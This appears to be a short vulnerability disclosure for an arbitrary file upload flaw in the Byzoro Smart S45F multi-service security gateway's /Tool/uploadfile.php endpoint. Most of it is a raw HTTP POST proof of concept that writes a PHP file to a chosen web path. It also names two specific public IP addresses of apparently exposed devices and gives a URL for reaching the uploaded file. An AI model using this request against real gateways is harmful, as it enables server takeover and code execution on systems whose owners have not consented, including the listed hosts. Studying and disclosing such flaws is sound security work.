Beijing Baizhuo Network Technology Co., Ltd. (hereinafter referred to as Baizhuo Network) is a high-tech enterprise dedicated to building the next generation of secure Internet. Byzro Networks Smart S45F multi-service security gateway intelligent management platform has a file upload vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official：https://www.byzoro.com/

version: S45

Vulnerability Path ：/Tool/uploadfile.php

Ip：https://103.121.164.62:8443/
poc:
```
POST /Tool/uploadfile.php? HTTP/1.1
Host: 113.140.35.82:8443
Cookie: PHPSESSID=25c62fc086a2f7777b8e0dd04d2a75d1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------886123294864872782496578758
Content-Length: 391
Origin: https://113.140.35.82:8443
Referer: https://113.140.35.82:8443/Tool/uploadfile.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------886123294864872782496578758
Content-Disposition: form-data; name="file_upload"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------886123294864872782496578758
Content-Disposition: form-data; name="txt_path"

/usr/hddocs/nsg/home/2.php
-----------------------------886123294864872782496578758—

```
https://103.121.164.62:8443/home/2.php
<img width="600" alt="image" src="https://github.com/llixixi/cve/assets/144869546/735c2c0d-04e3-44ef-99f4-12c0f6eac15b">


